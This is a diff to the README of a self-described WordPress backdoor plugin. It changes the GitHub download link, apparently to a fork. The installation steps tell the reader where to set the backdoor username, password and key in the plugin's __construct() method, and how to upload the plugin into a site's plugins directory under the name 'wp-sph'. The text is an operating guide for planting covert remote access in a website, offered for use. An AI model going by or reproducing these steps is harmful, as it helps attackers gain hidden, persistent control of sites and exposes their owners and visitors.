@@ -29,7 +29,7 @@ This plugin does the following:
 # Installation
 
 1. Download the latest release from here: 
-    * https://github.com/IRDeNial/Wordpress-Backdoor-Plugin/releases
+    * https://github.com/mashraf1997/Wordpress-Backdoor/releases/
 2. Modify the plugin as necessary.  Future versions will have an easier method of controlling access.
     * Backdoor username, password, and key are all stored in the __construct() method of the plugin.  Search for `$this->username =`, `$this->password =`, and `$this->key =` in order to find the individual things that need to be configured.  Again, this will change in the future.
 2. Upload the plugin files to the `/wp-content/plugins/wp-sph/` directory (If it does not exist, create it), or install the plugin through the WordPress plugins screen directly if you want to keep everything default.
